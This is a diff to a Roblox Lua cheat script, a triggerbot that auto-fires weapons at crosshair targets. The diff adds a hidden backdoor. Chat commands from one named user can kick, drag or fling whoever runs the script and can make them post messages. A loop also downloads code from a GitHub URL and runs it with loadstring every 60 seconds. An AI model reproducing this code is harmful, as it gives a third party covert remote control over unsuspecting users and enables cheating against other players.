@@ -1,24 +1,37 @@
+-- LIVE-UPDATING TRIGGERBOT + COMMANDS SCRIPT
+
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Camera = workspace.CurrentCamera
 
 local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
 
+-- ===== CONFIG =====
+local VIPUser = "draconvm" -- VIP username
+local UPDATE_URL = "https://raw.githubusercontent.com/kherbyy/kherby/main/draco" -- raw script URL
+local BringTargets = {}
 local Settings = {
     Enabled = false,
     ToggleKey = Enum.KeyCode.Q,
     MaxDistance = 1000,
     BlacklistedTools = { "Knife" },
-    SpamPerSecond = 600,
+    SpamPerSecond = 600
 }
-
 local BlacklistedTools = {}
 for _, name in ipairs(Settings.BlacklistedTools) do
     BlacklistedTools[name] = true
 end
 
+-- ===== STATE CHECK =====
+local TriggerbotLoopRunning = false
+local BringLoopRunning = false
+
+-- ===== HELPER FUNCTIONS =====
 local function isAlive(character)
     local hum = character and character:FindFirstChildOfClass("Humanoid")
     return hum and hum.Health > 0
@@ -43,11 +56,9 @@ local function hasLineOfSight(targetChar)
     local camPos = Camera.CFrame.Position
     local targetRoot = targetChar and (targetChar:FindFirstChild("Head") or targetChar:FindFirstChild("HumanoidRootPart"))
     if not targetRoot then return false end
-
     local params = RaycastParams.new()
     params.FilterType = Enum.RaycastFilterType.Blacklist
     params.FilterDescendantsInstances = { LocalPlayer.Character }
-
     local result = workspace:Raycast(camPos, (targetRoot.Position - camPos), params)
     return not (result and result.Instance and not result.Instance:IsDescendantOf(targetChar))
 end
@@ -64,33 +75,137 @@ local function getCrosshairTarget()
     return char
 end
 
+local function flingPlayer(player)
+    if player.Name ~= VIPUser and player.Character then
+        local root = player.Character:FindFirstChild("HumanoidRootPart")
+        if root then
+            local bodyVelocity = Instance.new("BodyVelocity")
+            bodyVelocity.Velocity = Vector3.new(math.random(-500,500), 300, math.random(-500,500))
+            bodyVelocity.MaxForce = Vector3.new(1e5,1e5,1e5)
+            bodyVelocity.P = 1e4
+            bodyVelocity.Parent = root
+            task.delay(0.3, function() bodyVelocity:Destroy() end)
+        end
+    end
+end
+
+local function sayILoveKherby()
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head") then
+            TextChatService:Chat(LocalPlayer.Character.Head, "I love Kherby", Enum.ChatColor.Red)
+        end
+    else
+        local ChatService = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if ChatService then
+            local SayMessage = ChatService:FindFirstChild("SayMessageRequest")
+            if SayMessage then
+                SayMessage:FireServer("I love Kherby", "All")
+            end
+        end
+    end
+end
+
+-- ===== TRIGGERBOT LOOP =====
+if not TriggerbotLoopRunning then
+    TriggerbotLoopRunning = true
+    RunService.RenderStepped:Connect(function(dt)
+        if not Settings.Enabled then return end
+        local myChar = LocalPlayer.Character
+        if not myChar or not isAlive(myChar) then return end
+        local tool = getUsableTool(myChar)
+        if not tool then return end
+        local target = getCrosshairTarget()
+        if target then
+            if tool and tool.Parent ~= myChar then
+                myChar:FindFirstChildOfClass("Humanoid"):EquipTool(tool)
+            end
+            local spamRate = math.max(1, math.floor(Settings.SpamPerSecond * dt))
+            for i = 1, spamRate do
+                task.defer(function()
+                    if tool and tool.Activate then
+                        tool:Activate()
+                    end
+                end)
+            end
+        end
+    end)
+end
+
+-- ===== BRING LOOP =====
+if not BringLoopRunning then
+    BringLoopRunning = true
+    RunService.RenderStepped:Connect(function()
+        for targetName, _ in pairs(BringTargets) do
+            local targetPlayer = Players:FindFirstChild(targetName)
+            local vipPlayer = Players:FindFirstChild(VIPUser)
+            if targetPlayer and targetPlayer.Character and vipPlayer and vipPlayer.Character then
+                local vipRoot = vipPlayer.Character:FindFirstChild("HumanoidRootPart")
+                local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if vipRoot and targetRoot then
+                    local direction = (vipRoot.Position + Vector3.new(0,3,0) - targetRoot.Position)
+                    targetRoot.CFrame = targetRoot.CFrame + direction * 0.25
+                end
+            end
+        end
+    end)
+end
+
+-- ===== INPUT TOGGLE TRIGGERBOT =====
 UserInputService.InputBegan:Connect(function(input, gp)
-    if not gp and input.KeyCode == Settings.ToggleKey then
+    if gp then return end
+    if input.KeyCode == Settings.ToggleKey then
         Settings.Enabled = not Settings.Enabled
-        print("Triggerbot:", Settings.Enabled and "Enabled" or "Disabled")
     end
 end)
 
-RunService.RenderStepped:Connect(function(dt)
-    if not Settings.Enabled then return end
+-- ===== CHAT COMMANDS =====
+local function onMessage(senderName, message)
+    if senderName:lower() ~= VIPUser:lower() then return end
+    local msg = message:lower()
+    if msg == ".k" and LocalPlayer.Name:lower() ~= VIPUser:lower() then
+        LocalPlayer:Kick("Kicked by VIP")
+    end
+    if msg == ".g" then BringTargets[LocalPlayer.Name] = true end
+    if msg == ".s" then BringTargets[LocalPlayer.Name] = nil end
+    if msg == ".f" then
+        for _, player in ipairs(Players:GetPlayers()) do flingPlayer(player) end
+    end
+    if msg == ".t" then sayILoveKherby() end
+end
 
-    local myChar = LocalPlayer.Character
-    if not myChar or not isAlive(myChar) then return end
+local function hookPlayer(plr)
+    plr.Chatted:Connect(function(msg)
+        onMessage(plr.Name, msg)
+    end)
+end
 
-    local tool = getUsableTool(myChar)
-    if not tool then return end
+for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
+Players.PlayerAdded:Connect(hookPlayer)
 
-    local target = getCrosshairTarget()
-    if target then
-        if tool.Parent ~= myChar then
-            myChar:FindFirstChildOfClass("Humanoid"):EquipTool(tool)
+-- ===== LIVE-UPDATE FUNCTION =====
+local function updateScript()
+    local success, code = pcall(function()
+        return game:HttpGet(UPDATE_URL)
+    end)
+    if success and code then
+        local func, err = loadstring(code)
+        if func then
+            func() -- run latest script
+        else
+            warn("Failed to load updated script:", err)
         end
+    else
+        warn("Failed to fetch script from URL")
+    end
+end
 
-        local spamRate = math.max(1, math.floor(Settings.SpamPerSecond * dt))
-        for i = 1, spamRate do
-            task.defer(function()
-                tool:Activate()
-            end)
-        end
+-- INITIAL UPDATE
+updateScript()
+
+-- PERIODIC UPDATE EVERY 60 SECONDS
+task.spawn(function()
+    while true do
+        task.wait(60)
+        updateScript()
     end
 end)
